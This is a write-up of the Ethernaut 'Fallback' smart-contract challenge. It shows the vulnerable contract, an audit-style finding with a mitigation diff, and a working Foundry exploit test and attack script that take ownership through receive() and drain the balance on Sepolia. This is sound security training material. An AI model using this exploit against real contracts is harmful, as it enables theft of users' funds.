# Level 1: Fallback

**Level Page**: [See on Ethernaut](https://ethernaut.openzeppelin.com/level/0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB)

**Description**:

Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0
  Things that might help

How to send ether when interacting with an ABI
How to send ether outside of the ABI
Converting to and from wei/ether units (see `help()` command)
Fallback methods


**Code**:

The smart contract to be exploited:

<details>
<summary>See Code</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

</details>

# Findings

### [H-1] Weak comparison can lead to an attack that loses ownership and reduces all contract balances cheaply

**Description**: The comparison `msg.value > 0 && contributions[msg.sender] > 0` in `Fallback::receive` function should not compare only if the contribution is greater than zero, this leads a malicious address to send an ETH contribution using `Fallback::contribute` function and send ETH directly to the contract right after. Then the malicious address can claim ownership by just sending `1 wei`, for example, since the `msg.value` is greater than zero and the `contributions[msg.sender]` is too. After claiming the ownership the address can execute the `Fallback::withdraw` function and steal all the contract balances.

**Impact**: Any strange address could claim the ownership and therefore, steal all the contract balances using the `Fallback::withdraw` function.

**Proof of Code**:

See the complete code in `test/FallbackAttack.t.sol`.

<details>

<summary>See Code</summary>

```javascript
  function testShouldStealContractBalance() public{
    address contribuitor1 = vm.addr(1);
    address contribuitor2 = vm.addr(2);
    vm.deal(contribuitor1, 1e18);
    vm.deal(contribuitor2, 1e18);

    vm.prank(contribuitor1);
    fallbackContract.contribute{value: 100 wei}();

    vm.prank(contribuitor2);
    fallbackContract.contribute{value: 100 wei}();

    assertEq(address(fallbackContract).balance, 200);

    // attack
    vm.startPrank(attacker);

    // Contributing
    fallbackContract.contribute{value: 1}();
    
    // Sending eth
    (bool success,) = payable(address(fallbackContract)).call{value: 1}("");
    if(!success) revert();

    // Withdrawing all eth
    fallbackContract.withdraw();

    vm.stopPrank();

    assertEq(fallbackContract.owner(), attacker);
    assertEq(address(attacker).balance, INITIAL_BALANCE + 200);
    assertEq(address(fallbackContract).balance, 0);
  }
```

</details>

**Recommended Mitigation**: The mitigation depends on the project requirements. But here are some ways we could fix this issue:

1. Remove the `Fallback::receive` function and only allow users to contribute through `Fallback::contribute` function.
2. Update the `Fallback::receive` comparison to `msg.value > 0 && contributions[msg.sender] > contributions[owner]`. This would ensure that the ownership is only changed if the user contribution is greater than the last owner. This would be like:

```diff
receive() external payable {
-   require(msg.value > 0 && contributions[msg.sender] > 0);
+   require(msg.value > 0 && contributions[msg.sender] > contributions[owner]);
    owner = msg.sender;
}
```

# Attack

**Description**: The attack used the strategy tested in `FallbackAttack.t.sol`, so we just need to build a script as `FallbackAttack.s.sol` that implements this strategy and sends to the chain.

Code snippet:

```javascript
  // Contributing
  fallbackContract.contribute{value: 1 wei}();

  // Sending eth
  (bool success,) = payable(address(fallbackContract)).call{value: 1 wei}("");
  if(!success) revert();

  // Withdrawing all eth
  fallbackContract.withdraw();
```

**Instance used**: [0x836c5bc2ac19240bAD8c3d2fB56F36D355A56B25](https://sepolia.etherscan.io/address/0x836c5bc2ac19240bAD8c3d2fB56F36D355A56B25)

**Attack Transactions**: [see on etherscan](https://sepolia.etherscan.io/address/0x836c5bc2ac19240bAD8c3d2fB56F36D355A56B25)

**Level Completed Transaction**: [see on etherscan](https://sepolia.etherscan.io/tx/0xc28ef761dac3c5bd93ab5c5bc036953d70fbe1081430537b5f2b0313d08ad208)

# Getting started

## Build

```bash
make build
```

## Test

```bash
make test
```

## Attack (testnet)

```bash
make attack
```

## Submit level (testnet)

```bash
make submit
```

## Check if you completed the level (testnet)

`true` - You completed the level
`false` - You didn't complete the level

```bash
make check
```